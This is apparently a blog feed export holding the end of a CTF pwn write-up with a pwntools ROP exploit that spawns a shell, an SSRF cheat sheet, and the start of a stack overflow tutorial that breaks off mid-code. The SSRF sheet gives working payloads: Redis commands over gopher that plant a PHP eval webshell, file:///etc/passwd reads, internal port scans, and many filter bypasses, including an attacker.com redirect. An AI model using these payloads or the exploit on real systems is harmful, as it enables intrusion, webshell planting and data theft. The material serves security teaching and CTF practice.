class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19907</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ROP Gadgets:</span></span><br><span class="line"><span class="string">    0x000000000040ed4d : xor eax, eax ; ret</span></span><br><span class="line"><span class="string">    0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000410253 : pop rsi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000449915 : pop rdx ; ret</span></span><br><span class="line"><span class="string">    0x00000000004499DF : syscall</span></span><br><span class="line"><span class="string">    0x00000000004156c4 : pop rax ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.bss:00000000006BB300 unk_6BB300</span></span><br><span class="line"><span class="string">.bss:00000000006BB33F                 db    ? ;</span></span><br><span class="line"><span class="string">0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">read 0x0 fd buf count</span></span><br><span class="line"><span class="string">execve 0x3b filename 0 0</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x00000000006BB300</span></span><br><span class="line">xor_eax = <span class="number">0x000000000040ed4d</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000410253</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000449915</span></span><br><span class="line">syscall = <span class="number">0x00000000004499DF</span></span><br><span class="line">bin_sh = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pop_rax = <span class="number">0x00000000004156c4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendafter(</span><br><span class="line">    <span class="string">&#x27;Yes?\n&#x27;</span>, pg.get(<span class="number">0x410</span>+<span class="number">8</span>) + p64(xor_eax) + p64(pop_rdi) + p64(<span class="number">0</span>) +</span><br><span class="line">    p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(<span class="number">8</span>) + p64(syscall) +</span><br><span class="line">    p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(pop_rdi) + p64(buf) + </span><br><span class="line">    p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">)</span><br><span class="line">conn.send(bin_sh)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BlueWhale OpenJudge Pwn Challenge WriteUp Part 1. Including &quot;bof&quot;, &quot;ROP&quot;, &quot;shellcode&quot;, &quot;canary&quot;, &quot;test&quot;, &quot;pwnalpha&quot;, &quot;pwnbeta&quot;, &quot;pwngamma&quot;, &quot;pwndelta&quot;, &quot;pwnepsilon&quot;, &quot;pwnzeta&quot;, &quot;pwneta&quot;, &quot;pwntheta&quot;.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="BlueWhale" scheme="https://srpopty.github.io/tags/BlueWhale/"/>
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>SSRF CheatSheet</title>
    <link href="https://srpopty.github.io/2020/10/10/SSRF-CheatSheet/"/>
    <id>https://srpopty.github.io/2020/10/10/SSRF-CheatSheet/</id>
    <published>2020-10-10T08:52:35.000Z</published>
    <updated>2021-07-31T12:53:51.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>SSRF(Server Side Request Forgery, 服务端请求伪造)，由于服务器后端没有能够很好的过滤攻击者的输入，导致攻击者能够以服务端的身份发送任意请求，常用来进行网络钓鱼或者内网探测。例如：<a href="http://www.example.com/ssrf.php?url=http://www.xxxx.com/">www.example.com/ssrf.php?url=http://www.xxxx.com/</a></p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><ul><li><p>PHP</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    file_get_contents($_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="comment">// ================= or ============================</span></span><br><span class="line">$curl = curl_init();</span><br><span class="line">    curl_setopt($curl, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($curl,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    $result=curl_exec($curl);</span><br><span class="line">    curl_close($curl);</span><br><span class="line">    <span class="comment">// ================= or ============================</span></span><br><span class="line">    fsockopen($url);</span><br></pre></td></tr></table></figure></li><li><p>Python</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">urlopen(url)</span><br><span class="line">requests.get(url)</span><br></pre></td></tr></table></figure></li><li><p>Java</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Request.Get.execute</span></span><br><span class="line"><span class="comment">Request.Post.execute</span></span><br><span class="line"><span class="comment">HttpURLConnection.getInputStream</span></span><br><span class="line"><span class="comment">URLConnection.getInputStream</span></span><br><span class="line"><span class="comment">URL.openStream</span></span><br><span class="line"><span class="comment">okhttp</span></span><br><span class="line"><span class="comment">ImageIO.read</span></span><br><span class="line"><span class="comment">OkHttpClient.newCall.execute</span></span><br><span class="line"><span class="comment">HttpClients.execute</span></span><br><span class="line"><span class="comment">HttpClient.execute</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String url = request.getParameter(<span class="string">&quot;picurl&quot;</span>);</span><br><span class="line">StringBuffer response = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">URL pic = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) pic.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">con.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0&quot;</span>);</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(con.getInputStream()));</span><br><span class="line">String inputLine;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">response.append(inputLine);</span><br><span class="line">  &#125;</span><br><span class="line">in.close();</span><br><span class="line">modelMap.put(<span class="string">&quot;resp&quot;</span>,response.toString());</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;getimg.htm&quot;</span>;</span><br><span class="line"><span class="comment">// ================= or ============================</span></span><br><span class="line">CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line">  HttpGet getRequest = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">  HttpResponse response = httpClient.execute(getRequest);</span><br><span class="line">  <span class="keyword">if</span>(response.getStatusLine().getStatusCode() == <span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        HttpEntity entity = response.getEntity();</span><br><span class="line">        <span class="keyword">return</span> EntityUtils.toByteArray(entity);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Error:下载图片失败&quot;</span>);</span><br><span class="line"><span class="comment">// ================= or ============================</span></span><br><span class="line">String host = request.getParameter(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">  String port = request.getParameter(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">  Socket socket = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">        socket = <span class="keyword">new</span> Socket(host, port);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          logger.error(<span class="string">&quot;connect test failed!&quot;</span>, e);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (socket != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                  socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                  logger.error(<span class="string">&quot;Socket close error!&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ================= or ============================</span></span><br><span class="line">String url = request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">  OkHttpClient httpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">  Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">        .url(url)</span><br><span class="line">        .build();</span><br><span class="line">  Response response = httpClient.newCall(request).execute();</span><br><span class="line">  <span class="keyword">return</span> response.body().string(); </span><br><span class="line"><span class="comment">// ================= or ============================</span></span><br><span class="line">String imgurl = request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">  URL url = <span class="keyword">new</span> URL(imgurl);</span><br><span class="line">  Image image = ImageIO.read(url);</span><br><span class="line">  <span class="keyword">return</span> image; </span><br></pre></td></tr></table></figure></li></ul><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><ul><li><p>伪协议</p><p>  java(仅能文件读取，端口扫描等，不支持gopher): file, ftp, mailto, http, https, jar, netdoc</p><p>  php: file, ftp, dict, sftp, ldap, tftp, gopher</p><p>  python: file gopher</p></li><li><p>gopher协议攻击内网应用</p><p>  radis未授权访问(6379)<code>?url=dict://127.0.0.1:6379/info</code></p><p>  payload生成脚本<code>python exp.py cmd.txt</code>，cmd.txt中存放着radis的命令，注意radis命令中value的空格需要被替换为<code>|space|</code>，例如<code>set s &#39;&lt;?php eval($_GET[&quot;a&quot;]);?&gt;&#39;</code>需要被替换为<code>set 1 &#39;&lt;?php|space|eval($_GET[&quot;cmd&quot;]);?&gt;&#39;</code></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    cmd = cmd.split()</span><br><span class="line">    result = <span class="string">&#x27;*%s\r\n&#x27;</span> % str(len(cmd))</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        _c = c.replace(<span class="string">&quot;|space|&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">        result += <span class="string">&quot;$%d\r\n%s\r\n&quot;</span> % (len(_c), _c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            payload += fmt(line.strip()))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;gopher://&quot;</span> + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span> + quote(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  写任意写文件（如果需要密码，则在最开始加上auth yourpassword）(注意使用\n将payload与其他日志分隔开)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;\n\n&lt;?php eval($_GET[&quot;a&quot;]);?&gt;\n\n&#39;</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li><li><p>http协议探测内网主机，内网应用指纹识别</p></li><li><p>dict协议内网端口扫描</p><p>  <code>?url=dict://127.0.0.1:22/</code></p><p>  <code>?url=dict://127.0.0.1:80/</code></p><p>  <code>?url=dict://127.0.0.1:22/</code></p><p>  <code>?url=dict://127.0.0.1:3306/</code></p><p>  <code>?url=dict://127.0.0.1:22</code></p><p>  <code>?url=dict://127.0.0.1:6379/info</code></p><p>  <code>?url=dict://127.0.0.1:1234</code></p></li><li><p>file协议读取本地文件</p><p>  <code>?url=file:///etc/passwd</code></p></li><li><p>gopher协议伪造POST请求（注意修改Content-Length）</p><p>  <code>gopher://127.0.0.1:80/_POST /index.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 3%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ax=1</code></p></li><li><p>DNS重绑定（条件：服务器需要向DNS服务器请求解析两次域名，并且DNS服务器可控）</p><ol><li>客户端（攻击者）向服务器发送正常域名<code>?url=http://example.com</code></li><li>服务器拿到域名以后需要做DNS解析，例如验证该域名是否为内网IP，DNS服务器第一次返回了一个非内网IP地址A</li><li>该域名在服务器端通过验证，域名被传递给可以产生SSRF的函数，例如<code>url_open</code>，这时又会发生第二次DNS解析</li><li>服务端再次向DNS服务器发送解析请求，而这时DNS服务器中该域名的IP已经被修改为内网IP地址B，并且该域名的TTL被修改为0，即DNS服务器会直接返回B而不是之前缓存的A</li><li>服务器收到内网IP地址B，成功绕过。</li></ol></li></ul><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><ul><li><p>域名前缀限制，例如：必须以指定域名开头<code>^http://www.baidu.com.*</code></p><p>  <code>http://www.baidu.com@127.0.0.1</code>等价于<code>http://127.0.0.1</code></p></li><li><p>域名后缀限制，例如：必须以指定域名结尾<code>.*baidu.com$</code></p><p>  <code>0://127.0.0.1?baidu.com/</code></p><p>  <code>0://127.0.0.1:80?baidu.com:80/</code></p><p>  <code>0://127.0.0.1:80=baidu.com:80/</code></p><p>  <code>0://127.0.0.1:80?baidu.com:80/</code></p><p>  <code>0://127.0.0.1;baidu.com/</code></p><p>  <code>0://abc@127.0.0.1:80@baidu.com/</code></p><p>  <code>0://127.0.0.1$baidu.com/</code></p></li><li><p>内网IP限制，限制输入中不能包含127.0.0.1</p><p>  尝试其他本地地址，例如localhost，127.0.0.2，127.233.233.233</p><p>  尝试IP地址的省略写法，127.1等价于127.0.0.1</p><p>  尝试本机地址，0.0.0.0</p><p>  使用[::]，例如<code>http://[::]:80/</code>等价于<code>http://127.0.0.1:80/</code></p><p>  使用<code>http://0/</code>等价于<code>http://127.0.0.1/</code></p></li><li><p>利用短地址</p></li><li><p>中文句号</p><p>  127。0。0。1等价于127.0.0.1</p></li><li><p>特殊DNS</p><p>  <code>http://a.b.c.127.0.0.1.xip.io/</code>等价于<code>http://127.0.0.1/</code></p></li><li><p>IP进制转换</p><p>  ip地址进制转换 127.0.0.1等价于十六进制0x7F000001等价于十进制2130706433等价于二进制0b1111111000000000000000000000001</p><p>  也可以只转换部分IP，例如127.0.0.1等价于0177.0.0.1等价于0x7f.0x0.0x0.0x1</p><p>  也可以混合编码0177.0x0.0x0.0x1</p></li><li><p>Enclosed alphanumerics</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><p>  <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code>等价于<code>example.com</code></p></li><li><p>利用重定向</p><p>  访问<code>http://attacker.com/redi.php</code>，其中redi.php内容为</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;location: http://127.0.0.1&quot;</span>);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></li><li><p>利用ipv6</p><p>  <code>::1</code>等价于ipv4的127.0.0.1</p><p>  ip6-localhost等价于ipv4的localhost</p><p>  x.1.ip6.name等价于ipv4点127.0.0.1.xip.io</p></li></ul>]]></content>
    
    
    <summary type="html">SSRF payloads and attack methods.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stack Overflow CheatSheet</title>
    <link href="https://srpopty.github.io/2020/10/10/StackOverflow-CheatSheet/"/>
    <id>https://srpopty.github.io/2020/10/10/StackOverflow-CheatSheet/</id>
    <published>2020-10-10T08:52:35.000Z</published>
    <updated>2021-08-14T08:26:07.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文中的内容均以x86架构为基础</p></blockquote><h1 id="0x0-寄存器"><a href="#0x0-寄存器" class="headerlink" title="0x0 寄存器"></a>0x0 寄存器</h1><p>32位程序寄存器最大32位（4字节）如eax，64位程序寄存器最大64位（8字节）如rax。寄存器大小示意图如下。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/2.png"></p><h1 id="0x1-栈"><a href="#0x1-栈" class="headerlink" title="0x1 栈"></a>0x1 栈</h1><p>栈是一种后入先出（LIFO）的数据结构，在内存空间中由高地址向低地址生长，如下所示。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/1.png"></p><h1 id="0x2-函数调用"><a href="#0x2-函数调用" class="headerlink" title="0x2 函数调用"></a>0x2 函数调用</h1><p>程序执行过程中所调用的每一个函数都有属于其自己的栈帧（Stack Frame），栈帧中保存该函数内部使用的各种局部变量。每个函数的栈帧由栈底寄存器ebp和栈顶寄存器esp确定，其中esp可能随着函数内部的执行而变化，ebp一直不变，所以大部分局部变量与函数参数的位置均根据ebp来确定。</p><p>在调用一个新函数时需要做三件事</p><ul><li>传递参数，32位与64位参数传递方式不同：32位程序将参数从右向左压入栈中传递，64位程序前6个参数通过寄存器rdi，rsi，rdx，rcx，r8，r9传递，从第7个参数开始从右向左压入栈中传递</li><li>保存返回地址，即调用完新函数以后要执行的下一条指令地址，该操作由call指令完成，即<code>call = (push eip &amp;&amp; eip = ret_addr)</code></li><li>进入被调用者的流程，被调用者保存调用者的栈帧，在栈上push当前ebp，之后使esp=ebp，即<code>push ebp &amp;&amp; esp = ebp</code>，最后开辟新栈帧</li></ul><p>当一个函数执行完成后需要做三件事</p><ul><li><p>传递返回值到eax中，若返回值大于4字节小于8字节，则高4字节放入eax，低4字节放入edx</p></li><li><p>恢复调用者的栈帧，恢复原来的esp，使esp=epb，并且pop栈上的old ebp到当前ebp中，该操作由leave指令完成，即<code>(esp = ebp &amp;&amp; pop ebp)</code></p></li><li><p>跳转到执行完函数的下一条地址，恢复到调用者的执行流程，该操作由ret指令完成，即<code>ret = pop eip</code></p></li></ul><p>常见32位调用约定如下，64位只有一种调用约定，前6个参数通过寄存器rdi，rsi，rdx，rcx，r8，r9传递，从第7个参数开始从右向左入栈</p><ul><li>cdecl：C函数/C++非成员函数默认的调用约定，参数从右向左入栈，调用者清理栈中参数，eax存放返回值，支持可变参数（例如printf）</li><li>stdcall：Pascal或WinAPI常用，参数从右向左入栈，被调用者清理栈中参数，eax存放返回值</li><li>fastcall：前两个小于4字节的参数使用ecx和edx传递，其余参数从右向左入栈，被调用者清理栈中参数，eax存放返回值</li><li>thiscall：C++非静态的成员函数使用，C++成员函数需要使用this指针，若参数数量固定，则this指针通过ecx传递，其余参数从右向左入栈，被调用者清理栈中参数；若参数数量不固定，所有参数从右向左入栈，最后this指针入栈，调用者清理栈中参数</li></ul><p>发生函数调用<code>func(1, 2, 3)</code>时，栈变化如下所示（cdecl，32位，64位除了参数传递使用寄存器以外其余均相同），其中ret表示call func指令结束之后下一条指令的地址，即返回地址，old ebp表示调用者栈帧的ebp。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/3.png"></p><p>函数func执行完毕后，栈变化如下所示（cdecl，32位），为了便于表示，将leave指令拆分为两条指令。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/4.png"></p><h1 id="0x3-栈溢出"><a href="#0x3-栈溢出" class="headerlink" title="0x3 栈溢出"></a>0x3 栈溢出</h1><p>局部变量保存在栈中，当程序接受用户输入并且保存到局部变量中时，若接收到的数据长度大于栈中给局部变量预留的数据长度，则可以发生溢出，修改局部变量之后的数据，包括old ebp以及ret，如果可以修改ret，就可以劫持控制流，当函数执行结束以后就可以跳转到任意指定地址。栈溢出过程如下图所示，假设func函数中有一块16字节大小的局部变量buf，但是接收到了超过16字节大小的数据并且被写入到buf中，假设输入的数据为<code>&#39;A&#39;*(16+4) + &#39;B&#39;*4</code>，可以看到返回地址ret已经被修改为BBBB，将payload中的BBBB修改为其他有可执行权限的地址即可。</p><p><img src="/2020/10/10/StackOverflow-CheatSheet/5.png"></p><p>可能会造成栈溢出的函数</p><ul><li><p>read</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从文件fd中读取nbyte个字节写入到buf中</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbyte)</span></span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，0为从标准输入读取</span></span><br><span class="line"><span class="comment">// buf: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要读取的字节数</span></span><br><span class="line"><span class="comment">// 返回实际读取到字节数，若返负数表示出现了错误</span></span><br></pre></td></tr></table></figure></li><li><p>write</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从buf中读取nbytes个字节写入到文件fd中</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *buf,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，1表示输出到标准输出</span></span><br><span class="line"><span class="comment">// buf: 要读取位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 返回实际写入到字节数，若返回负数表示出现了错误</span></span><br></pre></td></tr></table></figure></li><li><p>gets</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取字符串到str所指的位置中</span></span><br><span class="line"><span class="comment">// gets会从输入缓冲区读取到换行符为止，作为一个字符串，并且删去最后的换行符写入str中</span></span><br><span class="line"><span 